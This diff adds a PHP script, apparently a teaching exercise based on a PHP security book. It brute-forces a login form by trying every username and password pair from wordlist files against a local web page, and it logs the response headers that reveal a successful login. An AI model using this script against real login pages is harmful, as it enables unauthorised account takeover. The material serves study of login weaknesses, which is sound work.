@@ -1,0 +1,69 @@
+<?php
+/*
+ * Based on Chris Shiflett, Essential PHP Security, 2005, O'Reilly
+ * Chapter 7
+ */
+
+
+/*
+Run this command from command line
+php bruteforce.php -- localhost Security/Sec.1.1/login0Auth.php darkuids.txt darkpwds.txt darkresults.txt
+*/
+
+if (count($argv) != 7) {
+    $s = "php bruteforce.php -- localhost urlpath userids passwords results\n";
+    $s .= "the latter three being filenames\n";
+    die($s);
+}
+
+$host = $argv[2];
+$url = $argv[3];
+$ids = file_get_contents($argv[4]);
+$idsa = explode("\r\n", $ids);
+$pwds = file_get_contents($argv[5]);
+$pwdsa = explode("\r\n", $pwds);
+$results = $argv[6];
+
+$http_header = '';
+$http_header .= "POST /" . $url . " HTTP/1.1\r\n";
+$http_header .= "Host: " . $host ."\r\n";
+$http_header .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$http_header .= "Content-Length: %s\r\n";
+$http_header .= "Connection: close\r\n";
+$http_header .= "\r\n";
+
+$s = '';
+foreach($idsa as $uid) {
+    foreach($pwdsa as $pwd) {
+        $content  = 'user=';
+        $content .= $uid;
+        $content .= '&password=';
+        $content .= $pwd;
+        $request = $http_header . $content;
+        $request = sprintf($request, strlen($content));
+        $response = '';
+
+        if ($handle = fsockopen('localhost', 80)) {
+            fputs($handle, $request);
+            while (!feof($handle)) {
+                $response .= fgets($handle, 1024);
+            }
+            fclose($handle);
+            /* Check response */
+            var_dump($response);
+            //die();
+            preg_match('/Location: \S+/', $response, $m, PREG_OFFSET_CAPTURE);
+            if (count($m))
+                $s .= sprintf("\n%s %s", $content, $m[0][0]);
+            preg_match('/Content-Length: \d+/', $response, $m, PREG_OFFSET_CAPTURE);
+            if (count($m))
+                $s .= sprintf("\n%s %s", $content, $m[0][0]);
+        } else {
+            /* Error in sockopen */
+            die("WTF");
+        }
+        file_put_contents($results, $s);
+    }
+}
+echo "\n";
+?>
